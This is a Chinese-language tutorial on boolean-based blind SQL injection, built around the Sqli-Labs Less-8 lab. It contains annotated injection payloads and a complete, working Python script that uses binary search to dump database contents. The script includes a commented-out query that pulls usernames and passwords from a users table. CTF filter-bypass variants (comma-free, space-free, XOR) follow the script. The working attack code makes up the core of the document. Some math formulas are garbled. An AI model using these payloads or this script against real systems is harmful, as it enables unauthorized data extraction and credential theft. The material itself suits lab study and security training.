# 🤖 布尔盲注底层机制与二分法自动化脚本精解

> **适用场景**：当目标页面**既没有数据回显位**（无法 UNION 联合查询），**又关闭了错误信息打印**（屏蔽了 `mysqli_error`，报错注入失效），但页面在查询结果为“真”（True）和为“假”（False）时会表现出**截然不同的两种渲染状态**（如真时显示“用户存在”，假时显示“用户不存在”或空白）。

## 0. 基础前置认知与小白扫盲：什么是“盲注”？

> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 通俗生活比喻：与一个只能点头摇头的哑巴对话
* **显错与联合查询（有话直说）**：你问系统“管理员密码是什么”，页面直接大大方方打出 `admin123`；
* **布尔盲注（全盲只能点头摇头）**：
  * 页面被程序员写死了，无论你查出什么数据，页面永远只显示两种固定状态：要么是“用户名存在 / 操作成功”（代表条件为真 True），要么是“用户名不存在 / 操作失败”（代表条件为假 False）。
  * 页面**绝不会直接透露任何一个字符的内容**！
  * **黑客的审讯技巧**：
    * “请问密码的第 1 个字符的 ASCII 码，大于 100 吗？” -> 页面显示成功（点头：说明大于 100）；
    * “请问大于 110 吗？” -> 页面显示失败（摇头：说明在 100 到 110 之间）；
    * 像玩猜数字游戏一样，不断询问判断题，把密码一个字母一个字母地抠出来！

---

### 2. 盲注核心底层函数与参数拆解
在编写盲注 Python 自动化脚本时，以下三个函数是绝对的基石：
* **`SUBSTR(str, pos, len)` / `MID()`（字符串切片器）**：
  * `SUBSTR(password, 1, 1)`：从 `password` 字符串的第 1 位开始，向后切出 1 个字符（即提取第 1 个字母）。
* **`ASCII(char)` / `ORD()`（字符转数字翻译机）**：
  * 计算机只认数字。`ASCII('a')` 的结果是 97，`ASCII('b')` 是 98。把字符转成纯数字后，就可以利用大于号 `>`、小于号 `<`、等于号 `=` 进行严密的数学区间判断。
* **线性查找 vs 二分查找（二分法让效率暴增 95%）**：
  * ASCII 可见字符一共有 95 个（从 32 到 126）。
  * 如果逐个挨个试（线性枚举），猜一个字母平均要向目标服务器发 48 次 HTTP 请求，跑出一个 32 位 MD5 密码需要发 1500+ 次请求，极易触发网站防刷限流；
  * 如果采用**二分查找（Binary Search）**：每次都猜中间值（$rac{	ext{low} + 	ext{high}}{2}$），每一次判断都能直接排除掉一半的可能！猜一个字母只需要 $\log_2(95) pprox 7$ 次请求，32 位密码仅需 200 次请求即可秒杀！

## 一、底层判断机制与核心函数剖析

布尔盲注的本质是**逻辑提问**。攻击者向数据库提出一系列“是/否”问题，通过页面返回的二元状态（True / False）逆向推导每一个字节。

### 1. 核心判断函数矩阵
| 函数 / 表达式 | 语法作用 | 关键参数拆解 | 替代函数（用于绕过过滤） |
| :--- | :--- | :--- | :--- |
| `length(str)` | 获取字符串字节长度。 | `str`：待测的子查询结果，如 `database()`。 | `char_length()`（字符数） |
| `substr(str, pos, len)` | 截取字符串指定片段。 | 1. `str`：待截取的源字符串；<br>2. `pos`：起始偏移（**从 1 开始**）；<br>3. `len`：截取长度（盲注中通常固定为 `1`）。 | `mid(str, pos, len)`<br>`left(str, pos)`<br>`substr(str from pos for len)` (**无逗号绕过核心**) |
| `ascii(char)` | 将字符转换为 ASCII 码整数。 | `char`：单个字符（如 `'a'` $\rightarrow$ `97`）。 | `ord()`<br>`conv(hex(char), 16, 10)` |

## 二、算法效率：为什么必须使用二分法？

常见可打印 ASCII 字符区间为 `32`（空格）至 `126`（波浪号 `~`），共 95 个有效字符。

* **普通线性暴力穷举（Linear Search）**：
  * 每个字符位平均需要发起 $95 / 2 \approx 47$ 次 HTTP 请求。
  * 若要读取长为 32 位的 MD5 或 Flag，需发起约 $32 \times 47 \approx 1500$ 次请求，极易触发目标服务器限流或被 WAF 封禁 IP。
* **二分折半查找（Binary Search）**：
  * 利用 `>` 大于号判断区间，每次提问直接排除一半候选值。
  * 时间复杂度降为 $O(\lceil\log_2 95\rceil) = 7$ 次。
  * 读取 32 位数据仅需 $32 \times 7 = 224$ 次请求！**提速近 7 倍，网络开销下降 85%！**

## 三、标准利用 Payload 逐参数拆解

以 Sqli-Labs Less-8（单引号字符型盲注）为例：

### 1. 探测数据库名长度 Payload：
```sql
?id=1' AND length(database()) > 5 --+
```
* `?id=1'`：闭合原语句的前单引号。
* `AND`：逻辑与。只有左侧 `id=1` 存在且右侧条件为真时，整个 `WHERE` 子句才返回真。
* `length(database()) > 5`：向数据库发问“当前库名长度是否大于 5？”若页面回显正常（包含 `You are in...........`），则说明长度 $> 5$；否则 $\le 5$。

### 2. 探测第 1 个字符 ASCII 码 Payload：
```sql
?id=1' AND ascii(substr(database(), 1, 1)) > 100 --+
```
* `database()`：目标源字符串。
* `1, 1`：从第 1 个字符开始，截取 1 个字符。
* `ascii(...) > 100`：询问第 1 个字符的 ASCII 码是否大于 100。

## 四、工业级 Python 自动化二分法盲注脚本

以下脚本经过生产级优化，包含 `requests.Session` 连接池复用、异常超时重试以及精细的状态机设计。

```python
import requests
import time

# ==================== 配置区 ====================
TARGET_URL = "http://127.0.0.1/sqli-labs/Less-8/"
# 页面为 True 时的独特标志字符串（必须是 False 状态下绝对不会出现的特征）
TRUE_FLAG = "You are in..........."

# 使用 Session 复用 TCP 握手连接，大幅提升发包性能
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})

def send_payload(payload: str) -> bool:
    """
    底层发包函数：将构造好的 SQL 条件嵌入目标 URL 并发包
    返回布尔值：True 表示条件成立，False 表示条件不成立
    """
    url = f"{TARGET_URL}?id=1' AND {payload} --+"
    try:
        resp = session.get(url, timeout=3)
        # 页面存在特定字符串即判定为真
        return TRUE_FLAG in resp.text
    except requests.RequestException as e:
        print(f"[-] 网络波动或超时: {e}，正在重试...")
        time.sleep(1)
        return send_payload(payload)

def get_length(sql_target: str) -> int:
    """二分法探测待查字符串的长度"""
    print(f"[*] 正在探测 [{sql_target}] 的长度...")
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        # 发送发问：长度是否 > mid
        if send_payload(f"length(({sql_target})) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    print(f"[+] 测算完成：长度为 {low}")
    return low

def dump_data(sql_target: str) -> str:
    """二分法逐字符提取完整字符串内容"""
    data_length = get_length(sql_target)
    extracted_str = ""
    
    print(f"[*] 开始提取数据内容...")
    # 逐个字符位遍历
    for index in range(1, data_length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            # 发送发问：第 index 位字符的 ASCII 是否 > mid
            payload = f"ascii(substr(({sql_target}), {index}, 1)) > {mid}"
            if send_payload(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        char = chr(low)
        extracted_str += char
        print(f"[+] 第 {index:02d} 位: [{char}] -> 当前累计: {extracted_str}")
        
    return extracted_str

if __name__ == "__main__":
    start_time = time.time()
    
    # 实战任务 1：提取当前数据库名
    db_name = dump_data("database()")
    print(f"\n[★] 最终脱库数据库名: {db_name}")
    
    # 实战任务 2：提取目标 users 表数据（示例）
    # user_data = dump_data("SELECT group_concat(username, 0x3a, password) FROM users")
    # print(f"[★] 最终敏感数据: {user_data}")
    
    print(f"[*] 任务耗时: {time.time() - start_time:.2f} 秒")
```

## 五、CTF 极端限制下的高阶变种绕过

### 1. 当逗号 `,` 被过滤时（无逗号盲注）
* **常规写法**：`substr(str, 1, 1)`（含有逗号）
* **绕过写法 1（`FROM ... FOR ...` 语法）**：
  ```sql
  ascii(substr(database() FROM 1 FOR 1)) > 100
  ```
* **绕过写法 2（`LIKE` 或正则逐位匹配）**：
  ```sql
  database() LIKE 's%'
  database() REGEXP '^sec'
  ```

### 2. 当空格被过滤时
使用括号进行语法隔离或内联注释：
```sql
?id=1'AND(ascii(substr(database(),1,1))>100)--+
?id=1'/**/AND/**/ascii(substr(database(),1,1))>100--+
```

### 3. 当逻辑词 `AND` 被过滤时（异或盲注 `^`）
若后端禁用了 `AND`、`OR`，可以使用**异或运算符（`^`）**：
* 异或逻辑规则：`1 ^ 1 = 0`（假），`1 ^ 0 = 1`（真）。
* Payload 构造：
  ```sql
  ?id=1' ^ (ascii(substr(database(),1,1))>100) --+
  ```
  如果条件为真（结果为 1），则 `1 ^ 1 = 0`，页面展示 False；反之如果条件为假（结果为 0），则 `1 ^ 0 = 1`，页面展示 True。**逻辑完全翻转，实现无 AND 盲注！**
